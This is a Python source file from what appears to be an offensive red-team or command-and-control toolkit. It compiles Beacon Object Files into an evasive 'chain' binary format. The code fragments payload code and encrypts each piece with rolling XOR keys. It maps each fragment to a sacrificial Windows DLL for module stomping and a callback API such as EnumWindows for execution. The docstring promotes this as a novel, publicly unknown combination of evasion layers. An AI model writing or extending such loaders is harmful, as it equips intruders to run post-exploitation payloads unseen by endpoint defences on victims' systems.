#!/usr/bin/env python3
"""
chain_compiler.py - Phased Chain Compilation Engine (Layer C)

NOVEL COMBINATION (publicly does NOT exist):
  Combines ALL layers into a single .chain.bin:
    - Polymorphic compilation (Phase 2)
    - JIT rolling encryption (Layer B)
    - Multi-DLL fragmentation (Layer A)
    - Callback chain execution (Layer C)

Chain Binary Format ("CHN1"):
  [4B magic "CHN1"]
  [4B num_fragments]
  [4B flags]  (bit 0: poly, bit 1: JIT)

  For each fragment:
    [4B frag_size]
    [4B dll_index]       (0-5, which sacrificial DLL)
    [4B callback_index]  (0-5, which callback API)
    [32B jit_key]        (rolling XOR initial key)
    [4B jit_chunk_size]
    [N bytes: encrypted fragment code]

  [4B real_coff_size]
  [M bytes: full COFF data]  (for real BOF execution)

Agent execution:
  For each fragment:
    1. Load DLL[dll_index]
    2. Decrypt fragment (JIT rolling XOR)
    3. Stomp into DLL .text
    4. Execute via callback[callback_index]
    5. Clean up (restore + free)
  Finally: Execute real BOF via stomped loader
"""

import os
import sys
import struct
import hashlib
import json
import random
import shutil
import subprocess
import tempfile

# Reuse from other modules
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from jit_encryptor import parse_coff_text_section, rolling_xor_encrypt

CHAIN_MAGIC = b"CHN1"

# Sacrificial DLLs (must match agent-side)
CHAIN_DLLS = [
    "xpsservices.dll",   # index 0
    "devobj.dll",         # index 1
    "msftedit.dll",       # index 2
    "rsaenh.dll",         # index 3
    "winmm.dll",          # index 4 - Multimedia API (very common)
    "asycfilt.dll",       # index 5
]

# Callback APIs (must match agent-side)
CHAIN_CALLBACKS = [
    ("user32.dll",   "EnumWindows",         0),  # index 0
    ("user32.dll",   "EnumChildWindows",    1),  # index 1
    ("kernel32.dll", "EnumResourceTypes",   1),  # index 2
    ("user32.dll",   "EnumDesktopWindows",  1),  # index 3
    ("kernel32.dll", "EnumSystemLocalesA",  0),  # index 4
    ("user32.dll",   "EnumDisplayMonitors", 0),  # index 5
]


def find_safe_split_points(text_data, num_fragments):
    """Find safe points to split .text code (after ret/jmp)."""
    safe_points = []
    i = 0
    while i < len(text_data):
        if text_data[i] == 0xC3:  # ret
            safe_points.append(i + 1)
            i += 1
        elif text_data[i] == 0xE9 and i + 5 <= len(text_data):  # jmp rel32
            safe_points.append(i + 5)
            i += 5
        else:
            i += 1

    if len(safe_points) < num_fragments - 1:
        chunk_size = len(text_data) // num_fragments
        return [chunk_size * (i + 1) for i in range(num_fragments - 1)]

    target_indices = [
        int(len(safe_points) * (i + 1) / num_fragments)
        for i in range(num_fragments - 1)
    ]
    target_indices = [min(i, len(safe_points) - 1) for i in target_indices]
    return [safe_points[i] for i in target_indices]


def create_chain_bof(bof_o_path, output_path, num_fragments=3,
                      use_poly=False, verbose=False):
    """Create a chain-compiled BOF binary.

    Combines: fragmentation + JIT encryption + callback chain metadata.

    Args:
      bof_o_path: Path to input .o file
      output_path: Path to output .chain.bin
      num_fragments: Number of chain phases (default 3)
      use_poly: Whether to apply polymorphic compilation first
      verbose: Print details

    Returns:
      Dict with chain info
    """
    if verbose:
        print(f"[*] Chain compiling: {bof_o_path}")
        print(f"    Fragments: {num_fragments}")
        print(f"    Polymorphic: {use_poly}")

    # Step 1: Optionally apply polymorphic compilation
    # IMPORTANT: Polymorphic compiler needs .c source, not .o file.
    # So we look for the .c file corresponding to the .o file.
    if use_poly:
        if verbose:
            print(f"[*] Step 1: Polymorphic compilation...")
        try:
            from polymorphic_compile import compile_bof_polymorphic
            import random as _rng
            rng = _rng.Random()

            # Derive .c path from .o path
            # e.g., /path/bof_whoami.x64.o -> /path/bof_whoami.c
            bof_c_path = bof_o_path.rsplit('.x64.o', 1)[0] + '.c'
            if not os.path.isfile(bof_c_path):
                # Try without bof_ prefix
                base = os.path.basename(bof_o_path).replace('bof_', '').replace('.x64.o', '')
                bof_c_path = os.path.join(os.path.dirname(bof_o_path), '..', 'bofs', f'bof_{base}.c')
                if not os.path.isfile(bof_c_path):
                    bof_c_path = os.path.join(os.path.dirname(bof_o_path), 'bofs', f'bof_{base}.c')

            if os.path.isfile(bof_c_path):
                if verbose:
                    print(f"[*] Found source: {bof_c_path}")
                poly_out = bof_o_path + ".poly.tmp"
                compile_bof_polymorphic(bof_c_path, poly_out, rng=rng, verbose=verbose)
                bof_o_path = poly_out
            else:
                if verbose:
                    print(f"[!] Could not find .c source for polymorphic compile")
        except Exception as e:
            if verbose:
                print(f"[!] Polymorphic compile failed, using original: {e}")

    # Step 2: Parse .text section
    text_data, text_offset, text_size, full_coff = parse_coff_text_section(bof_o_path)

    if verbose:
        print(f"[*] Step 2: Parsed .text: {text_size} bytes")

    if text_size < num_fragments * 20:
        num_fragments = max(2, text_size // 20)
        if verbose:
            print(f"[!] Reduced fragments to {num_fragments} (text too small)")

    # Step 3: Fragment the .text section
    split_points = find_safe_split_points(text_data, num_fragments)
    split_points = [0] + split_points + [text_size]

    if verbose:
        print(f"[*] Step 3: Fragmented into {num_fragments} pieces")
        print(f"    Split points: {[hex(p) for p in split_points]}")

    # Step 4: JIT encrypt each fragment + assign DLL/callback
    fragments = []
    for i in range(num_fragments):
        start = split_points[i]
        end = split_points[i + 1]
        frag_code = text_data[start:end]
        frag_size = len(frag_code)

        # Generate JIT key for this fragment
        jit_key = bytes([random.randint(0, 255) for _ in range(32)])
        chunk_size = 16

        # Encrypt with rolling XOR
        encrypted, _ = rolling_xor_encrypt(frag_code, jit_key, chunk_size)

        # Assign DLL and callback (cycle through available options)
        dll_idx = i % len(CHAIN_DLLS)
        cb_idx = i % len(CHAIN_CALLBACKS)

        fragments.append({
            'code': encrypted,
            'size': frag_size,
            'dll_index': dll_idx,
            'callback_index': cb_idx,
            'jit_key': jit_key,
            'jit_chunk_size': chunk_size,
            'original_offset': start,
        })

        if verbose:
            dll_name = CHAIN_DLLS[dll_idx]
            cb_name = CHAIN_CALLBACKS[cb_idx][1]
            print(f"    Fragment {i}: {frag_size} bytes → {dll_name} + {cb_name}")

    # Step 5: Build chain binary
    chain_binary = CHAIN_MAGIC
    chain_binary += struct.pack('<I', num_fragments)
    flags = 0
    if use_poly:
        flags |= 1
    flags |= 2  # JIT always on
    chain_binary += struct.pack('<I', flags)

    for frag in fragments:
        chain_binary += struct.pack('<I', frag['size'])
        chain_binary += struct.pack('<I', frag['dll_index'])
        chain_binary += struct.pack('<I', frag['callback_index'])
        chain_binary += frag['jit_key']  # 32 bytes
        chain_binary += struct.pack('<I', frag['jit_chunk_size'])
        chain_binary += frag['code']

    # Append full COFF for real execution
    chain_binary += struct.pack('<I', len(full_coff))
    chain_binary += full_coff

    with open(output_path, 'wb') as f:
        f.write(chain_binary)

    if verbose:
        print(f"\n[+] Chain compilation complete!")
        print(f"    Output: {output_path}")
        print(f"    Size: {len(chain_binary)} bytes")
        print(f"    Fragments: {num_fragments}")
        print(f"    Chain phases:")
        for i, frag in enumerate(fragments):
            dll = CHAIN_DLLS[frag['dll_index']]
            cb = CHAIN_CALLBACKS[frag['callback_index']][1]
            print(f"      Phase {i}: {dll} → {cb}")

    return {
        'output': output_path,
        'size': len(chain_binary),
        'fragments': num_fragments,
    }


if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser(description='Chain BOF Compiler (Layer C)')
    p.add_argument('bof_path', help='Path to BOF .o file')
    p.add_argument('-o', '--output', default=None)
    p.add_argument('-n', '--fragments', type=int, default=3)
    p.add_argument('--poly', action='store_true')
    p.add_argument('-v', '--verbose', action='store_true')
    args = p.parse_args()

    if args.output is None:
        base = os.path.splitext(os.path.basename(args.bof_path))[0]
        base = base.replace('bof_', '').replace('.x64', '')
        args.output = f"{base}.chain.bin"

    create_chain_bof(args.bof_path, args.output,
                      num_fragments=args.fragments,
                      use_poly=args.poly, verbose=args.verbose)
